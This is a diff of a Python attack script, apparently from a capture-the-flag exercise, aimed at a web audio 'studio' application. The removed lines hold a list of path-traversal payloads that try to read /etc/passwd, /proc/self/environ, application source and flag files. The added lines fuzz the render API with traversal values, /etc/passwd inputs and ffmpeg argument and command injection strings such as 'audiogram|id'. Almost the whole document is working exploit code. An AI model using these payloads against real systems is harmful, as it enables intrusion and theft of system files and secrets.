@@ -6,13 +6,11 @@ cj = http.cookiejar.CookieJar()
 opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
 opener.addheaders = [("User-Agent", "Mozilla/5.0 studio")]
 
-def do(path, data=None, headers=None, method=None, raw=False):
-    url = BASE + path if path.startswith("/") else path
-    r = urllib.request.Request(url, data=data, method=method)
+def do(path, data=None, headers=None, method=None):
+    r = urllib.request.Request(BASE + path, data=data, method=method)
     for k, v in (headers or {}).items(): r.add_header(k, v)
     try:
-        resp = opener.open(r, timeout=60)
-        return resp.status, dict(resp.getheaders()), resp.read()
+        resp = opener.open(r, timeout=90); return resp.status, dict(resp.getheaders()), resp.read()
     except urllib.error.HTTPError as e:
         return e.code, dict(e.headers), e.read()
     except Exception as e:
@@ -20,63 +18,57 @@ def do(path, data=None, headers=None, method=None, raw=False):
 
 def make_wav(seconds=1, rate=8000):
     n=seconds*rate
-    frames=b"".join(struct.pack("<h",int(3000*math.sin(2*math.pi*220*i/rate))) for i in range(n))
-    h=b"RIFF"+struct.pack("<I",36+len(frames))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,rate,rate*2,2,16)+b"data"+struct.pack("<I",len(frames))
-    return h+frames
+    fr=b"".join(struct.pack("<h",int(3000*math.sin(2*math.pi*220*i/rate))) for i in range(n))
+    return b"RIFF"+struct.pack("<I",36+len(fr))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,rate,rate*2,2,16)+b"data"+struct.pack("<I",len(fr))+fr
 
-def multipart(files):
-    b="----wbnd7392xk"; body=io.BytesIO()
-    for k,(fn,ct,c) in files.items():
-        body.write(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fn}\"\r\nContent-Type: {ct}\r\n\r\n".encode()); body.write(c); body.write(b"\r\n")
+def multipart(fn, content):
+    b="----wbnd"; body=io.BytesIO()
+    body.write(f"--{b}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: audio/wav\r\n\r\n".encode()); body.write(content); body.write(b"\r\n")
     body.write(f"--{b}--\r\n".encode()); return body.getvalue(), f"multipart/form-data; boundary={b}"
 
-# session + upload + render to learn workspace path
-do("/studio")
-body,ct=multipart({"clip":("clip.wav","audio/wav",make_wav())})
-do("/studio/upload",data=body,headers={"Content-Type":ct},method="POST")
-st,h,b=do("/api/render",data=json.dumps({"slug":"audiogram","theme":"midnight"}).encode(),headers={"Content-Type":"application/json"},method="POST")
-j=json.loads(b); print("render:",j)
-url=j["outputs"][0]["url"]; ws=url.split("/")[2]
-print("poster url:",url,"ws:",ws)
-st,h,b=do(url); print("GET poster:",st,h.get("Content-Type"),"len",len(b))
+def upload(fn="clip.wav", content=None):
+    if content is None: content=make_wav()
+    body,ct=multipart(fn,content); return do("/studio/upload",data=body,headers={"Content-Type":ct},method="POST")
 
-def show(label, st, h, b):
-    ctype=h.get("Content-Type","")
-    s=b[:400]
-    printable = all(9<=c<127 or c in (10,13) for c in b[:200]) if b else False
-    print(f"[{label}] {st} ct={ctype} len={len(b)} {'TEXT:' if printable else 'bin'} {s[:300] if printable else s[:40]!r}")
-    return b
+def render(**kw):
+    st,h,b=do("/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
+    try: return st, json.loads(b)
+    except: return st, b.decode('utf-8','replace')
 
-print("\n########## SERVE-ROUTE TRAVERSAL (LFI) ##########")
-payloads = [
-    f"/m/{ws}/../../../../etc/passwd",
-    f"/m/{ws}/..%2f..%2f..%2f..%2fetc%2fpasswd",
-    f"/m/{ws}/..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-    f"/m/{ws}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-    f"/m/{ws}/..%252f..%252f..%252fetc%252fpasswd",
-    f"/m/{ws}/....//....//....//....//etc/passwd",
-    f"/m/{ws}%2f..%2f..%2f..%2fetc%2fpasswd",
-    "/m/../etc/passwd",
-    "/m/..%2f..%2f..%2fetc%2fpasswd",
-    f"/m/{ws}/../../../../etc/passwd%00.png",
-    f"/m/{ws}/..\\..\\..\\..\\etc\\passwd",
-]
-for p in payloads:
-    st,h,b=do(p); show(p, st,h,b)
+do("/studio"); upload()
 
-print("\n########## try reading app source & flag via serve route ##########")
-files = ["etc/passwd","app/server.js","server.js","app/app.js","app.js","proc/self/environ",
-         "app/flag.txt","flag.txt","flag","app/flag","srv/app/flag.txt","root/flag.txt",
-         "app/config.js","app/package.json","proc/self/cmdline"]
-for f in files:
-    for tpl in [f"/m/{ws}/../../../../../{f}", f"/m/{ws}/..%2f..%2f..%2f..%2f..%2f{f}"]:
-        st,h,b=do(tpl)
-        if st==200 and (b[:15]!=b"\x89PNG\r\n\x1a\n"[:8]):
-            show("HIT "+tpl, st,h,b)
+print("########## FULL STDERR on normal render ##########")
+st,j=render(slug="audiogram",theme="midnight")
+print(st, json.dumps(j)[:200])
+st,j=render(slug="../../server.js",theme="midnight")
+print("\n--- traversal ../../server.js FULL errors ---")
+print(json.dumps(j, indent=1)[:6000])
 
-print("\n########## full studio inline JS ##########")
-st,h,b=do("/studio")
-m=re.search(r"<script>\s*\(function.*?</script>", b.decode('utf-8','replace'), re.S)
-print(m.group(0)[:2500] if m else "no inline")
+print("\n########## render PARAM FUZZ ##########")
+for kw in [
+    {"slug":"x","theme":"midnight","format":"txt"},
+    {"slug":"x","theme":"midnight","formats":["png","mp3"]},
+    {"slug":"x","theme":"midnight","ext":"mp3"},
+    {"slug":"x","theme":"midnight","input":"/etc/passwd"},
+    {"slug":"x","theme":"midnight","source":"/etc/passwd"},
+    {"slug":"x","theme":"midnight","clip":"/etc/passwd"},
+    {"slug":"x","theme":"../../../../etc/passwd"},
+    {"slug":"x","theme":"midnight","width":99999},
+    {"slug":"x","theme":"midnight","args":["-i","/etc/passwd"]},
+    {"slug":"x"},
+    {"theme":"midnight"},
+    {},
+]:
+    st,j=render(**kw)
+    print(f"\n>> {json.dumps(kw)[:80]} -> {st}")
+    print(json.dumps(j)[:500] if not isinstance(j,str) else j[:300])
+
+print("\n########## ffmpeg argument injection via slug (output arg) ##########")
+# slug becomes output filename with .png appended; try to break out with ffmpeg opts / protocols
+for slug in ["audiogram", "audiogram.png -i /etc/passwd", "concat:/etc/passwd", "/etc/passwd",
+             "audiogram|id", "audiogram.mp3", "a.png -frames 1 /tmp/x.png -y /etc/passwd"]:
+    st,j=render(slug=slug,theme="midnight")
+    print(f"\n>> slug={slug!r} -> {st}")
+    print(json.dumps(j)[:400] if not isinstance(j,str) else j[:300])
 
 print("\nDONE")
